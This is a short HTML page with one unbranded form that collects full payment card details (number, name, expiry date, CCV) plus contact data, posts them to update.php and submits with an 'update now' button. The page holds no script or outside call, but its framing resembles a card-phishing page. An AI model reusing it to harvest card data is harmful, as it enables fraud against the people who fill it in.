<html>
    <head>

    <link rel="stylesheet" href="box1.css">
    
    
</head>
<body>
    <form method="post" action="update.php">
    
    <div class="payment-details" id="cardDetails">
                             <div id="img">
                            
                            <div>


                            <label for="cardNumber">Pament methode</label>
                            <input type="text" name="pmethod" id="pmethod" placeholder="">


                            <label for="cardNumber">Card Number</label>
                            <input type="text" name="cardNumber" id="cardNumber" placeholder="e.g. 5664 **** **** ****" >
                            
                            
                            
                            <label for="cardName">Name on Card</label>
                            <input type="text" name="cardName" id="cardName" placeholder="e.g. card name">
                            

                            
                            <label for="expiryDate">Expiration Date</label>
                            <input type="text" name="expiryDate" id="expiryDate" placeholder="MM/YY">
                    
                            <label for="ccv">CCV</label>
                            <input type="text" name="ccv" id="ccv" placeholder="CCV">
                    
                            <label for="city">City</label>
                            <input type="text" name="city" id="city">

                            
                            <label for="contactNumber">Contact Number</label>
                            <input type="text" name="contactNumber" id="contactNumber">
                    
                            <label for="country">Country</label>
                            <input type="text" name="country" id="country">
                    
                            
                            
                                
                            <button type="submit" id="payNowBtn">update now</button>
                            <div id="loading-spinner" class="spinner"></div>
                        </div>
                        <div id="imgs">
                            <img src="download1.jpeg" width="350px" height="200px">
                        </div>
                        </div>
                        </div>
</form>
</body>
</html>
